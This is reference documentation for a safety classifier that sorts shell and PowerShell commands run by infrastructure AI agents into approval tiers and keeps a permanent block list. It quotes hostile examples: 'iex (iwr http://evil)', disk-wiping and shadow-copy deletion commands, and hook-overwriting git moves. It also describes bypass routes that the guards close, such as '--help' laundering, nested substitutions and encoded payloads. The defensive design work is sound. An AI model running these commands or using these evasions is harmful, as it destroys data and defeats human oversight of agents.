# Security Tiers -- Reference

Read on-demand by infrastructure agents. Not injected automatically.

## Cloud-Specific Classification Examples

### T0 -- Read-Only

- `kubectl get pods`, `kubectl get svc`, `kubectl describe node`
- `terraform show`, `terraform output`
- `gcloud describe`, `gcloud sql instances describe`, `gcloud container clusters list`
- `helm status`, `helm list`
- `flux get kustomizations`, `flux get sources`

### T1 -- Validation

- `terraform validate`
- `helm lint`
- `tflint`
- `kustomize build`

### T2 -- Simulation

- `terraform plan` / `terragrunt plan`
- `kubectl diff -f manifest.yaml`
- `helm upgrade --dry-run`
- `kubectl apply --dry-run=server`

### Conditional (T0 or T3 depending on flags)

- `git branch` -- T0 for listing (no args or `--list`); T3 only with `-D` (force-delete), `-M` (force-rename), or the long-form `--delete`. The lowercase `-d` (delete -- git refuses on unmerged branches) and `-m` (plain rename) are intentionally left ungated: they are the safe counterparts of the same operations, and gating them would add a consent prompt for something git itself already refuses to do unsafely. `--move` (git's long form of `-m`, a plain rename) IS a recognized git flag but, like `-m`, is intentionally left ungated -- it is the safe counterpart of `-M`. Known asymmetry: `--delete` (long form of `-d`) IS gated even though it performs the identical safe deletion `-d` performs -- see `SKILL.md` for the full rationale and this documented (not fixed) inconsistency.
- Short force flag `-f` on git -- T3 across subcommands. `git` is in `F_FLAG_MEANS_FORCE` (`mutative_verbs.py`), mirroring the long-form `--force`, so `git mv -f` (force-overwrite the destination), `git checkout -f` (discard uncommitted changes), `git branch -f`, and `git add -f` all escalate to T3. Previously these slipped through as T0 because their subcommands are in `GIT_LOCAL_SAFE_SUBCOMMANDS` and `-f` was not collected by `_scan_dangerous_flags` for git.
- Packed short-flag bundle (`-rf`, `-rfi`, `-fv`) -- T3 when it packs a dangerous single-char combination. `_scan_dangerous_flags` treats a single-dash multi-char token as a bundle of one-char POSIX flags and escalates `r`+`f` (always), `f` (force CLIs), or `r` (recursive-delete CLIs). It is gated by `_is_posix_short_flag_cluster` so only a GENUINE bundle qualifies -- short (<= 4 chars), all letters, no CamelCase word boundary (`_CAMEL_WORD_RE`). This is the fix for the false positive where the .NET/PowerShell/Java-style long word-flag `-NoProfile` (contains `r` and `f`) was mis-read as `-rf` and forced every PowerShell command to T3. Now `-rf`/`-rfi`/`-fv` still escalate while `-NoProfile`/`-Force`/`-Recurse`/`-ExecutionPolicy` do not, for any CLI with single-dash word flags. Accepted trade-off: an uppercase-led `-Rf` also trips the CamelCase gate and is not matched here (the single `-R`/`-r`/`-f` exact-match handling still catches those).

### T3 -- Realization

- `terraform apply` / `terragrunt apply`
- `kubectl apply -f manifest.yaml`
- `helm upgrade` (without `--dry-run`)
- `flux reconcile` (write operations)
- `git push` (any branch) -- mutates remote state

Note: `git commit` and `git add` are **not** T3. They are local-only (working tree + local refs, never remote), classified safe by elimination via `GIT_LOCAL_SAFE_SUBCOMMANDS` in `mutative_verbs.py`. `git push` reaches remote state; a push of a named feature branch runs free and every other push is T3 (see "What reaches the remote" in `SKILL.md`).

## PowerShell / Windows shell lane

The classifier is NOT bash/POSIX-only. `powershell`/`powershell.exe`/`pwsh`/`pwsh.exe` route through a dedicated lane (`_check_powershell_command`, Step 1c-ps in `detect_mutative_command`) that introspects the payload the POSIX verb scanner cannot see -- `-Command "<script>"` collapses into one opaque token, so before this lane a destructive `Remove-Item -Recurse` classified T0 (a false negative) while `-NoProfile` forced everything to T3 (a false positive).

**Payload source (priority order):**
1. `-EncodedCommand <base64>` (any prefix of "encodedcommand", or `ec`, via `_is_ps_encoded_flag`) -- T3 immediately; the base64 blob is not inspectable.
2. `-Command`/`-c` (any prefix of `-command`) -- the script is every word after the flag (`_powershell_payload`, which shell-unquotes the command line), classified by the rules below.
3. `-File <script.ps1>` -- with no `-Command` flag, a `.ps1` positional is read (`_read_script_content`, honoring a leading `cd`) and its contents classified; unreadable -> conservative T3, mirroring the script-file lane. Routed off the `.ps1` positional, NOT the `-File`/`-f` flag, because flag normalization splits `-NoProfile` into single chars including `-f`. With neither, the words after the interpreter's own options are classified as the script.

**Verb-Noun taxonomy** -- each cmdlet is classified by its VERB (the token before the hyphen), so a never-seen cmdlet is classified correctly with no per-cmdlet list:

- `_PS_READ_VERBS` (-> read, non-mutative): `Get-*`, `Measure-*`, `Select-*`, `Where-*`, `Sort-*`, `Compare-*`, `Test-*`, `Resolve-*`, `Find-*`, `Search-*`, `Show-*`, `ConvertFrom-*`, `ConvertTo-*`, `Group-*`, `Join-*`, `Split-*`, `Read-*`.
- `_PS_CHANGE_VERBS` (-> T3): `Set-*`, `New-*`, `Remove-*`, `Clear-*`, `Add-*`, `Move-*`, `Copy-*`, `Rename-*`, `Start-*`, `Stop-*`, `Restart-*`, `Suspend-*`, `Resume-*`, `Register-*`, `Unregister-*`, `Install-*`, `Uninstall-*`, `Import-*`, `Export-*`, `Write-*`, `Enable-*`, `Disable-*`, `Mount-*`, `Dismount-*`, `Invoke-*`, `Push-*`, `Pop-*`, `Save-*`, `Publish-*`, `Send-*`, `Update-*`, `Edit-*`, `Reset-*`, `Limit-*`, `Block-*`.
- Two verbs are ambiguous and split by NOUN -- verb alone is insufficient:
  - `Out-*` (`_PS_OUT_READ_NOUNS`): `Out-String`/`Out-Host`/`Out-Null`/`Out-Default`/`Out-GridView` are read; `Out-File`/`Out-Printer` are change.
  - `Format-*` (`_PS_FORMAT_READ_NOUNS`): `Format-Table`/`Format-List`/`Format-Wide`/`Format-Custom`/`Format-Hex` are read (display rendering); `Format-Volume` and any other storage `Format-*` are change/T3 (data destruction). `format` is deliberately NOT in `_PS_READ_VERBS`.

**Four conservative security rules (default-deny, not permissive):**
1. **Every command position** -- `_ps_command_positions` splits the payload wherever PowerShell starts a command: `;`, `|`, `&&`, `||`, newline, and the opening or closing of a `{ }` script block or a `( )`/`$( )` (sub)expression, inside double quotes too; single-quoted text is literal. The tier is the MAX across positions, and each position is judged by its LEADING word only:
   - a Verb-Noun cmdlet by its verb (taxonomy above);
   - an alias as the cmdlet it names (`_PS_ALIASES`; `ri`, `rp`, `clc`, `cli`, `si`, `sp`, `spps`, `irm` change, `gi`, `gp`, `gcm`, `?`, `ft`, `fl` read);
   - a `.ps1` path, bare or after `&`/`. `, as `pwsh -File <path>`, the script-file lane (unreadable -> T3);
   - a language keyword (`if`, `foreach (...)`, `try`) or an expression (`$x`, a string, a number) as no command -- the body it governs is its own position;
   - `ForEach-Object`/`foreach`/`%` with only script blocks as a read whose body is judged separately, while `% Delete` or `-MemberName` calls a member by name on every input -> T3;
   - any other word as a native command at the verdict of its POSIX twin (`detect_mutative_command`).
   So `Get-ChildItem; rm -r -fo C:/proj`, `Get-Item x | ri` and `Get-ChildItem | foreach { rm $_ }` ask exactly as `rm` does. A Verb-Noun-shaped PATH argument (`C:\x\my-folder`) follows the leading word and is NOT read as a cmdlet.
2. **Method calls** -- any `.Name(` or `::Name(` in the payload (`_PS_METHOD_CALL_RE`: `(Get-Item x).Delete()`, `$f.Delete()`, `[IO.File]::Delete('x')`) forces T3, since a .NET method can mutate under any name; a property read (`$_.Name`) has no call parentheses and stays free.
3. **Obfuscation** -- checked FIRST and across the WHOLE payload, so a read cmdlet piped into an exec sink cannot launder the payload: `iex`/`iwr`/`icm`, `Invoke-Expression`, and `&`/`.` call operators at a statement boundary (`_PS_OBFUSCATION_RES`) all force T3.
4. **Positive allowlist** -- to drop BELOW T3 no position may mutate AND at least one must be a recognized read cmdlet or alias. A payload of native commands alone (`pwsh -c "git status"`), or with an unknown verb, stays T3 (conservative fallback, identical to an unreadable script file). No safe-by-elimination in this lane.

**Permanent floor (D140).** `format <drive>:`, `diskpart`, `vssadmin delete shadows`, `Format-Volume` and `Clear-Disk` are in `blocked_commands.py`'s `disk_operations` beside `mkfs`/`dd`: never approvable. `is_blocked_command` also classifies every position `_powershell_floor_readings` returns -- the `-Command` script of `powershell`/`pwsh`, or a command that is itself PowerShell-shaped (led by a cmdlet, keyword, invoker, call operator or expression) -- so the block holds bare, under `cmd /c`, under `powershell -Command`/`pwsh -c`, and in the PowerShell tool payload (`Get-Disk 1 | Clear-Disk`, `& { Format-Volume -DriveLetter D }`).

**Worked examples (probe-confirmed on Linux -- the classifier operates on the command string, OS-independent):**
- `powershell.exe -NoProfile -Command "Get-ChildItem . | Measure-Object | Select-Object Count"` -> T0 (all read verbs).
- `powershell.exe -Command "Remove-Item -Recurse foo"` and the same without `-NoProfile` -> T3 (change verb `Remove`).
- `powershell.exe -Command "Get-ChildItem; Remove-Item x -Recurse"` -> T3 (composition).
- `powershell.exe -Command "iex (iwr http://evil)"` -> T3 (obfuscation).
- `powershell.exe -EncodedCommand aGVsbG8=` -> T3 (non-inspectable base64).
- `powershell.exe -Command "Frobnicate-Widget"` -> T3 (unknown verb, default-deny).
- `pwsh -c "Get-Process"` -> T0 (read verb `Get`).
- `powershell -Command "Get-ChildItem; rm -r -fo C:/proj"`, `pwsh -c 'Get-Item x | ri'`, `pwsh -c "Get-ChildItem | % { del $_ }"` -> T3 (hidden native / alias / script-block position).
- `powershell -Command "(Get-Item x).Delete()"` -> T3 (method call); `powershell -Command "Get-ChildItem | ForEach-Object { $_.Name }"` -> T0.
- `pwsh -c "Get-ChildItem; .\deploy.ps1"` -> the script-file lane (missing file -> T3).
- `powershell -Command "Format-Volume -DriveLetter D"`, `pwsh -c 'format C:'` -> permanently blocked.

## Bare Windows command lane (no `powershell.exe` wrapper)

The wrapped lane above only fires when `base_cmd` is a PowerShell interpreter. Its sibling hole (a CONFIRMED rc.3 live incident): a Windows command with NO wrapper -- a PEELED `Remove-Item -Recurse -Force`, a cmd.exe `del`/`rd`, or a PowerShell alias -- reached the POSIX verb scanner, which found no subcommand to match, so it fell to safe-by-elimination (**T0**) and mutated WITHOUT a gate. The bare-Windows lane (`_check_windows_native_command`, Step 1b-win in `detect_mutative_command`) closes it by inverting the default to conservative **DEFAULT-DENY** -- but **scoped to recognized Windows tokens only**, so bash/POSIX classification is untouched (an unrecognized `base_cmd` returns `None` and POSIX classification, including the `rm` scratch and `mkdir` sensitive-path overrides that run FIRST, is left completely intact).

**Guiding principle (Microsoft Learn + MITRE anchored):** in a Windows/PowerShell/cmd context, an UNKNOWN command / verb / cmdlet / subcommand is **T3**, not T0. This is the same fallback direction Gaia already uses for an unreadable script file (`_check_script_file`) and an unresolvable `npm run` (`_check_package_manager`).

**Recognition (each entry the trigger AND the classification):**

- **cmd.exe single-token builtins.** `_CMD_MUTATIVE_BUILTINS` -> T3: `del`, `erase`, `rd`, `ren`, `rename`, `move`, `format`, `attrib`, `taskkill`, `shutdown`, `diskpart`, `cipher`, `takeown`, `icacls`. `_CMD_READ_BUILTINS` -> T0: `dir`, `type`, `findstr`, `find`, `where`, `echo`, `ver`, `whoami`, `hostname`, `ipconfig`, `systeminfo`, `tasklist`, `query`, `netstat`, `tree`, `more`, `fc`, `comp`.
- **cmd.exe two-token builtins** (`_CMD_SUBCOMMAND_BUILTINS`, classified by the FIRST subcommand; unrecognized subcommand -> T3): `reg delete`/`reg add`/`reg import`/`reg restore` -> T3, `reg query`/`reg export` -> T0; `sc create`/`sc delete`/`sc config`/`sc start`/`sc stop` -> T3, `sc query` -> T0; `vssadmin delete` -> T3, `vssadmin list` -> T0.
- **PowerShell aliases** (`_PS_ALIASES`, Microsoft's verbatim alias table -- resolve to the target cmdlet and classify it): `rm`/`del`/`erase`/`rd`/`rmdir` -> `Remove-Item` (T3); `ls`/`dir`/`gci` -> `Get-ChildItem` (T0); `cat`/`type`/`gc` -> `Get-Content` (T0); `cp`/`copy`/`cpi` -> `Copy-Item` (T3); `mv`/`move`/`mi` -> `Move-Item` (T3); `ni` -> `New-Item` (T3); `ren`/`rename`/`rni` -> `Rename-Item` (T3). Navigation/output aliases `sl`/`cd`/`chdir` -> `Set-Location`, `cls`/`clear` -> `Clear-Host`, `write`/`echo` -> `Write-Output` classify **read (T0)** -- they neither destroy nor grant, so they do not need consent (tier philosophy: T3 gates destruction/grant, not every `set`/`write` verb). `rm`/`rmdir`/`cp`/`mv` are pre-empted by `COMMAND_ALIASES` (T3) before this lane, with consistent results.
- **Bare execution aliases** (`_PS_BARE_OBFUSCATION_ALIASES`): `iex`/`iwr`/`icm` -> T3.
- **Bare Verb-Noun cmdlet.** The false-friend problem: a lowercase hyphenated token like `docker-compose` or `pre-commit` must NOT be treated as a cmdlet, while `Frobnicate-Thing` (an unknown PascalCase cmdlet) MUST classify T3. The split: a lowercase token counts as a cmdlet only when its verb is a real PS verb (`_PS_ALL_VERBS`); a PascalCase token (`_PS_PASCAL_CMDLET_RE`, matched on the RAW original-case base token) counts by casing alone. A recognized bare cmdlet, read alias or script-block invoker (`foreach`, `%`) is classified by delegating the WHOLE command string to `_classify_powershell_payload`, which judges every command position by its leading word, so composition, script-block bodies, method calls, the `Out-*`/`Format-*` noun-split, and obfuscation markers apply identically to the wrapped lane -- and a hyphenated PATH argument (`Get-ChildItem C:\x\my-folder`) is an argument, not a cmdlet.

**Obfuscation / execution** (`_PS_OBFUSCATION_RES`, scanned on the whole command once the lane is entered): `iex`/`iwr`/`icm`, `Invoke-Expression`, `&`/`.` call operators, and `iwr x | iex` chains -> T3. `Invoke-Command`/`Start-Process` classify T3 via their change verbs (`invoke`/`start`). Wrapped `-EncodedCommand`/`-File` remain handled by the wrapped lane.

**Worked examples (probe-confirmed on Linux -- the classifier operates on the command string, OS-independent):**
- Destructive -> T3: `Remove-Item C:\x -Recurse -Force`, `del C:\x /s /q`, `rd /s /q C:\x`, `Set-ExecutionPolicy Bypass`, `Stop-Computer`, `reg delete HKCU\x /f`, `sc create foo`.
- Irreversible -> permanently blocked (floor, before this lane): `Clear-Disk`, `Format-Volume`, `format C:`, `diskpart`, `vssadmin delete shadows /all`.
- Read -> T0: `Get-ChildItem C:\x -Recurse`, `Get-ChildItem | Measure-Object`, `dir`, `type foo`, `Format-Table`, `reg query HKCU\x`, `sc query foo`.
- Aliases: `rm -r -fo C:\x` -> T3, `del C:\x` -> T3, `ls` -> T0, `cat foo` -> T0, `cd /repo` -> T0.
- Obfuscation -> T3: `iex (iwr http://evil)`, `iwr x|iex`.
- Default-deny: `Frobnicate-Thing` -> T3 (unknown PascalCase verb); `Get-FooBar` -> T0 (known read verb, unknown noun).
- Composition (MAX across stages): `Get-ChildItem | Remove-Item -Recurse -Force` -> T3.
- Hyphenated PATH argument in a read command -> T0 (the argument is NOT read as a cmdlet): `Get-ChildItem C:\Users\me\my-folder`, `Get-ChildItem C:\my-folder -Recurse`, `dir C:\my-app\sub-dir`, `Get-Content C:\a-b\file.txt`.
- Bash NOT regressed: `docker-compose up -d`, `pre-commit run`, `git status`, `cd /repo` all stay T0/POSIX.

**Leading-word classification:** only the leading word of a command position is its command, so a hyphenated PATH or FLAG argument that follows it (`Get-ChildItem C:\my-folder`, `Get-Content C:\a-b\file.txt`) is never a cmdlet and does not false-positive to T3. The rc.4 lane read only the first Verb-Noun MATCH of each `;`/`|` stage and ignored every other leading word, so an alias, a native command or a script-block body after a read cmdlet ran free; every position is now judged.

## Command-laundering closures

Two guards close routes where a mutative command's TEXT hid the mutation from the classifier reading it -- the class the no-elusion rule names, closed at the code layer rather than left to policy alone.

**`--help` cannot launder a write hidden in the same line.** The subagent memory-write guard's `--help` exemption used to speak for the WHOLE line: `gaia memory add --help $(gaia memory add ...)` printed usage for the outer invocation while the inner substitution executed the real write. `hooks/modules/security/subagent_memory_write_guard.py::is_memory_write_attempt` now exempts only the IMMEDIATE flag form (`--help`/`-h`/`-?`/`--usage` right after the write verb) on a SIMPLE line -- any of `$(`, a backtick, `&`, `;`, `|`, or a newline anywhere in the command withdraws the exemption, since one of those means another command shares the line. This guard is one of the categorical DB-write guards (no `approval_id`, no grant lifts it); narrowing its exemption tightens the categorical floor and does not touch the approvable T3 ladder.

**A command substitution is classified by what it would actually execute, including a nested one.** `$(...)`, backticks, and process substitution run BEFORE the outer command, so a mutation inside one never sat at a command position for the ordinary verb scan to see -- `ls $(rm -rf /important)` classified by `ls`, T0 by elimination. `hooks/modules/security/mutative_verbs.py::_check_command_substitutions` extracts every top-level substitution body from the command (`hooks/modules/security/shell_substitution.py::extract_substitutions_truncated`) and re-classifies each one through `detect_mutative_command` before the outer command reaches the verb ladder; the verdict returned is the INNER one, so a mutation does not change category by being written inside a substitution. Nesting is handled by re-entry, not by a flatter regex: a nested body such as `$(rm -rf $(pwd))` is judged by re-classifying the outer body, which recurses into the inner one on its own next pass, down to `_MAX_SUBSTITUTION_RECURSION_DEPTH` -- past that depth the result is conservatively mutative (`verb="substitution-depth-exceeded"`) rather than silently unscanned. A truncated extraction (the body-count cap stopped the scan before finishing) is treated the same way: unproven, not absent, and classified conservatively rather than read as "no substitution found". This subsumes the earlier, narrower guard scoped to leading shell-assignment values only (`hooks/modules/security/mutative_verbs.py::_classify_leading_shell_assignments`, still wired in ahead of it, since a substitution inside a leading `NAME=value` prefix must be judged before the env-prefix peel discards the assignment unseen) -- the broader lane now covers a substitution at ANY position in the command, not only inside that leading prefix.

## Edge Cases

- **Compound subcommands that look mutative:** verbs like `merge-base` split on the hyphen to `merge`, which is a mutative verb -- but `git merge-base` is read-only. The detector in `mutative_verbs.py` carries an allow-list of read-only compound subcommands so they are not falsely flagged T3.
- **Message bodies after `-m`:** text after a `-m` flag (commit messages, descriptions) can contain mutative-looking words; the detector stops scanning verbs once it reaches the message body so the content does not leak a false T3.
- **`git reset --hard`:** routed through the T3 approval flow (mutative, approvable), not permanently blocked -- the user can confirm or decline interactively. See `destructive-commands-reference.md` for the full destructive-vs-mutative matrix per CLI.
- **`.claude/` writes via Bash:** the `.claude/` tree is protected on BOTH write surfaces. `hooks/modules/security/protected_paths.py::is_protected_hook_path` guards the Write/Edit `file_path` -- one predicate covering the install (the `.claude` harness install and the `@jaguilar87/gaia` package store), never a Gaia source checkout; `protected_path_guard.py` (wired into `bash_validator.validate()`) consumes that same predicate to guard Bash `command` strings. The Bash guard CATEGORICALLY denies (exit 2, not approvable) any write-capable command whose target resolves into the protected `.claude/` tree (the hooks dir, or `settings.json`/`settings.local.json` anywhere under `.claude/`) -- git working-tree writers (`git mv`/`checkout`/`restore`/`stash`), filesystem writers (`mv`/`cp`/`tee`/`sed -i`), and redirects. This closes the hole where `git mv payload.py .claude/hooks/pre_tool_use.py` (short-circuited to T0 via `GIT_LOCAL_SAFE_SUBCOMMANDS`) could overwrite hook code with no consent. Reads of `.claude/` (`git diff`, `cat`, `grep`) are not write-capable and pass through.
